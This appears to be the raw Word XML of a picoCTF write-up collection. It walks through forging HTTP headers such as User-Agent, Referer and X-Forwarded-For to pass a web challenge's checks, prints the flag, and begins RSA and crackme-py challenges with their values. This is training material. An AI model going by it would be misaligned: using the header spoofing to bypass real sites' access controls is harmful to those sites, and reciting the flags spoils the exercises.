        <w:t>Solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32220772"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solution is divided into several steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E84693E"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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C66A25"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When we launch the challenge we arrive on this page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE2DDEB" w14:textId="1D5B1D16"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5057AB98" wp14:editId="6CDE0B0F">
            <wp:extent cx="6332220" cy="52260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06836F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Note that only people coming from an official browser can access the real site. We must therefore modify the header "User-Agent". </w:t>
      </w:r>
      <w:hyperlink r:id="rId8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We therefore replace the value by : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t xml:space="preserve">User-Agent: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>PicoBrowser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2912981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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4960D6A9"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After the first part we arrive on this page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2317EF5B" w14:textId="55084698"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4E5EB604" wp14:editId="69D2BF78">
            <wp:extent cx="4198620" cy="512064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8620" cy="5120640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6846475B"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users coming from other sites. So we need to add the header :"Refer". </w:t>
      </w:r>
      <w:hyperlink r:id="rId87"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put this value : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>: http://mercury.picoctf.net:36622/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2C4AF8"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3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D44EEED"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So we come to this page :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788EC40C" w14:textId="2DEE5704"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279A274" wp14:editId="470BE21D">
            <wp:extent cx="4137660" cy="520446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7660" cy="5204460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="18040B4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are told that the site only works in 2018. So let's add the following header : "Date". </w:t>
      </w:r>
      <w:hyperlink r:id="rId89"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Let's give it a date in 2018 like this : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>Date: Wed, 21 Oct 2018 07:28:00 GMT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3173A3"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4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2E340A"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Once the request is sent this page appears :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598F5F57" w14:textId="3B2B5FA5"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F59FE4E" wp14:editId="6B692132">
            <wp:extent cx="4122420" cy="51511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2420" cy="5151120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C49623F"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doesn't believe the users who are being stalked. Let's add the following header : "DNT" </w:t>
      </w:r>
      <w:hyperlink r:id="rId91"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Insert this command in your request : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>DNT: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564AFC54"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5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BEFCA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This time the site brings us to this page :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEF8036" w14:textId="6BD58A33"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2A7DB8B9" wp14:editId="2E075F08">
            <wp:extent cx="5516880" cy="488442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6880" cy="4884420"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="311686E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tells us that he accepts people from Sweden. We will therefore add the following header : "X-Forwarded-For" </w:t>
      </w:r>
      <w:hyperlink r:id="rId93"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You also need to find an IP address from Sweden. I found one here : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "https://awebanalysis.com/fr/ip-lookup/31.3.152.55/" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Adresse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> from Sweden</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="0088CC"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> And we get a header like this : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>X-Forwarded-For: 31.3.152.55</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48418230" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Step 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142C4F78"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Finally we arrive on this page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F174E1" w14:textId="59283D5F"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34246880" wp14:editId="23B10562">
            <wp:extent cx="4160520" cy="509778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5097780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="041D9DC1"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He wants us to speak Swedish to be able to access the last part. We are therefore going to modify the following header : "Accept-Language" </w:t>
      </w:r>
      <w:hyperlink r:id="rId95" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Explanation of the effect of the header</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> And let's put it the following value : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t xml:space="preserve">Accept-Language: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>sv,en;q</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>=0.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F39A990" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622AEFD7"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The challenge is relatively simple once you know where you have to operate the site. The rest is just research versus what the site tells us. Hoping that this could help you ;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243FE373" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>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If you liked this writeup you can check our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>github</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> with this </w:t>
      </w:r>
      <w:hyperlink r:id="rId96" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>link</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> and star our repository.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2B07F5" w14:textId="44E607A3" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47BFC371" w14:textId="1B29A8C4" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BE6C96">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BE6C96">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{http_h34d3rs_v3ry_c0Ol_much_w0w_f56f58a5}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283C37C1" w14:textId="7CC6EFED" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76EF575F" w14:textId="56F7D684" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CED5B4B" w14:textId="38D4482E" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42E1D0F9" w14:textId="6C1AA623" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55648A12" w14:textId="0D11AA09" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79B4D868" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D427312" w14:textId="0D935C10" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0DC04C97" wp14:editId="2546F79A">
            <wp:extent cx="4892464" cy="3779848"/>
            <wp:effectExtent l="0" t="0" r="381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97"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4892464" cy="3779848"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="693F819D" w14:textId="445C5FE4" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DA1DFAC" w14:textId="4F9FF34D" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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Mind your Ps and Qs</w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260EA80C"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 | 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5190AE" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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2021Cryptography</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23281F28" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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SARA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554000FF" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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3730AB6" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C9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In RSA, a small </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> value can be problematic, but what about </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>? Can you decrypt this? </w:t>
      </w:r>
      <w:hyperlink r:id="rId98" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>values</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="75132E2B" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRPr="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Decrypt my super sick RSA:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDF2A4B" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRPr="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>c: 62324783949134119159408816513334912534343517300880137691662780895409992760262021</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B66770F" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRPr="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>n: 1280678415822214057864524798453297819181910621573945477544758171055968245116423923</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D79156" w14:textId="3C681149" w:rsidR="00BE6C96" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001F4DD4">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>e: 65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6BE406" w14:textId="23701751" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">RSA </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3B4862" w14:textId="635495CA" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="325E7632" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD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lastRenderedPageBreak/>
        <w:t>crackme-py</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6CE91CAD"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45FE01BF" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD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3C95E19E" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD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5CFD2D15" w14:textId="77777777" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD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B771CA" w14:textId="553428BE" w:rsidR="001F4DD4" w:rsidRDefault="00000000" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId99" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="001F4DD4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>crackme.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D0BDBB0" w14:textId="5AF7C088"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DA21A30" w14:textId="7ED39C25"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76EDCB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Hiding this really important number in an obscure piece of code is brilliant!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA5DC8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AND it's encrypted!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4508E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We want our biggest client to know his information is safe with us.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BB14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"A:4@r</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>%u</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>L`M-^M0c0AbcM-MFE055a4ce`eN"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010DCA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090F980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 Reference alphabet</w:t>
      </w:r>
    </w:p>
